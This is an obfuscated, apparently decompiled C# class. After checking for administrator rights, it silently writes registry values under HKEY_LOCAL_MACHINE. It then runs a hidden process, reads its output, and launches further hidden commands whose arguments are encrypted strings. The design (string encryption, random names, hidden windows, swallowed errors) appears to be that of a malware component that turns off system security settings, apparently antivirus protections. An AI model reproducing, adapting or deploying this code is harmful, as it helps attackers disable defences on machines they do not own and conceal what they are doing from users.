using System;
using System.Diagnostics;
using System.Security.Principal;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace xNvWsvlcqg;

public static class xwgwjEmvAfv
{
	[NonSerialized]
	internal static GetString getString_0;

	public static void XiwZWdOWXvoPoEF()
	{
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			pjxfyiKQkGw(getString_0(107370964), getString_0(107370359), getString_0(107396509));
			pjxfyiKQkGw(getString_0(107370334), getString_0(107370273), getString_0(107396526));
			pjxfyiKQkGw(getString_0(107370280), getString_0(107370191), getString_0(107396526));
			pjxfyiKQkGw(getString_0(107370280), getString_0(107370154), getString_0(107396526));
			pjxfyiKQkGw(getString_0(107370280), getString_0(107370597), getString_0(107396526));
			KLsDcmBDIjm();
		}
	}

	private static void pjxfyiKQkGw(string string_0, string string_1, string string_2)
	{
		try
		{
			using RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(string_0, RegistryKeyPermissionCheck.ReadWriteSubTree);
			if (registryKey == null)
			{
				Registry.LocalMachine.CreateSubKey(string_0).SetValue(string_1, string_2, RegistryValueKind.DWord);
			}
			else if (registryKey.GetValue(string_1) != string_2)
			{
				registryKey.SetValue(string_1, string_2, RegistryValueKind.DWord);
			}
		}
		catch
		{
		}
	}

	private static void KLsDcmBDIjm()
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = getString_0(107358291),
			Arguments = getString_0(107370560),
			UseShellExecute = false,
			RedirectStandardOutput = true,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		Process process2 = process;
		process2.Start();
		while (!process2.StandardOutput.EndOfStream)
		{
			string text = process2.StandardOutput.ReadLine();
			if (text.StartsWith(getString_0(107370523)) && text.EndsWith(getString_0(107370486)))
			{
				harsvQRUfSjN(getString_0(107370509));
			}
			else if (text.StartsWith(getString_0(107370191)) && text.EndsWith(getString_0(107370486)))
			{
				harsvQRUfSjN(getString_0(107370440));
			}
			else if (text.StartsWith(BhIlEyPUpxxiJj.SrfpFCmHOqUxNO(getString_0(107369827))) && text.EndsWith(getString_0(107370486)))
			{
				harsvQRUfSjN(BhIlEyPUpxxiJj.SrfpFCmHOqUxNO(getString_0(107369782)));
			}
			else if (text.StartsWith(getString_0(107369693)) && text.EndsWith(getString_0(107370486)))
			{
				harsvQRUfSjN(BhIlEyPUpxxiJj.SrfpFCmHOqUxNO(getString_0(107369664)));
			}
			else if (text.StartsWith(BhIlEyPUpxxiJj.SrfpFCmHOqUxNO(getString_0(107370127))) && text.EndsWith(getString_0(107370486)))
			{
				harsvQRUfSjN(BhIlEyPUpxxiJj.SrfpFCmHOqUxNO(getString_0(107370094)));
			}
			else if (text.StartsWith(BhIlEyPUpxxiJj.SrfpFCmHOqUxNO(getString_0(107369985))) && text.EndsWith(getString_0(107370486)))
			{
				harsvQRUfSjN(BhIlEyPUpxxiJj.SrfpFCmHOqUxNO(getString_0(107369936)));
			}
			else if (text.StartsWith(BhIlEyPUpxxiJj.SrfpFCmHOqUxNO(getString_0(107369299))) && text.EndsWith(getString_0(107370486)))
			{
				harsvQRUfSjN(BhIlEyPUpxxiJj.SrfpFCmHOqUxNO(getString_0(107369254)));
			}
			else if (text.StartsWith(BhIlEyPUpxxiJj.SrfpFCmHOqUxNO(getString_0(107369165))) && text.EndsWith(getString_0(107370486)))
			{
				harsvQRUfSjN(BhIlEyPUpxxiJj.SrfpFCmHOqUxNO(getString_0(107369616)));
			}
			else if (text.StartsWith(BhIlEyPUpxxiJj.SrfpFCmHOqUxNO(getString_0(107369511))) && text.EndsWith(getString_0(107370486)))
			{
				harsvQRUfSjN(BhIlEyPUpxxiJj.SrfpFCmHOqUxNO(getString_0(107369438)));
			}
			else if (text.StartsWith(BhIlEyPUpxxiJj.SrfpFCmHOqUxNO(getString_0(107369389))) && !text.EndsWith(getString_0(107395944)))
			{
				harsvQRUfSjN(BhIlEyPUpxxiJj.SrfpFCmHOqUxNO(getString_0(107368804)));
			}
			else if (text.StartsWith(BhIlEyPUpxxiJj.SrfpFCmHOqUxNO(getString_0(107368727))) && !text.EndsWith(getString_0(107396509)))
			{
				harsvQRUfSjN(BhIlEyPUpxxiJj.SrfpFCmHOqUxNO(getString_0(107368698)));
			}
			else if (text.StartsWith(BhIlEyPUpxxiJj.SrfpFCmHOqUxNO(getString_0(107368637))) && !text.EndsWith(getString_0(107368624)))
			{
				harsvQRUfSjN(BhIlEyPUpxxiJj.SrfpFCmHOqUxNO(getString_0(107368619)));
			}
			else if (text.StartsWith(BhIlEyPUpxxiJj.SrfpFCmHOqUxNO(getString_0(107369038))) && !text.EndsWith(getString_0(107368624)))
			{
				harsvQRUfSjN(BhIlEyPUpxxiJj.SrfpFCmHOqUxNO(getString_0(107368957)));
			}
			else if (text.StartsWith(BhIlEyPUpxxiJj.SrfpFCmHOqUxNO(getString_0(107368868))) && !text.EndsWith(getString_0(107368624)))
			{
				harsvQRUfSjN(BhIlEyPUpxxiJj.SrfpFCmHOqUxNO(getString_0(107368311)));
			}
			else if (text.StartsWith(BhIlEyPUpxxiJj.SrfpFCmHOqUxNO(getString_0(107368266))) && !text.EndsWith(getString_0(107368624)))
			{
				harsvQRUfSjN(BhIlEyPUpxxiJj.SrfpFCmHOqUxNO(getString_0(107368185)));
			}
		}
	}

	public static void harsvQRUfSjN(string string_0)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = getString_0(107358291),
			Arguments = string_0,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		Process process2 = process;
		process2.Start();
	}

	static xwgwjEmvAfv()
	{
		Strings.CreateGetStringDelegate(typeof(xwgwjEmvAfv));
	}
}
